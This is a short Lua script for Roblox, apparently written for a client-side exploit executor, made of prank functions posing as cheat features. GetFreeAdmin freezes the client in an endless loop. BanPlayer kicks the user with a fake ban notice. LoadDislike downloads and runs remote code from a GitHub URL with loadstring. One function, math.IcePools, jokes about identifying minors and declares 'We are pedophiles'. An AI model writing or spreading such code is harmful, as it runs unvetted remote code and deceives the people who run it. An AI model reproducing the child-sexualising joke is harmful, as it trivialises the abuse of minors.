setreadonly(math, false)


function send(msg)
local args = {
   [1] = tostring(msg), -- just in case trol
   [2] = "All"
}
 
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end
 
 
function ShutdownServer(msg)
game:Shutdown(tostring(msg))
end
 
function GetFreeAdmin()
while true do end
end
 
function BanPlayer()
local LocalPlayer = game.Players.LocalPlayer
LocalPlayer:Kick("You have been banned from this game: We have detected hacks in your client.")
end
 
function GetBraincells()
print("Braincells:" .. tostring(math.random(1, 3)))
end
 
function LoadDislike()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/jnz-dev/leaks_and_whatnot/main/Leaks-Loader.lua'),true))()
end

function GetLocalPlayer()
 return game.Players.LocalPlayer
end

function GetALife()
   error("Not possible.")
end

function HowBadIsMyExploit()
   if not syn then return "dogwater exploit" else return "good exploit" end
 end

function math.IcePools(age)
  if age < 16 and age > 0 then
    return "Good, You have identified the minor."
  elseif age < 0 then
    return "Way too minor."
  else
    return "Return, We are pedophiles, not idiots."
  end
end
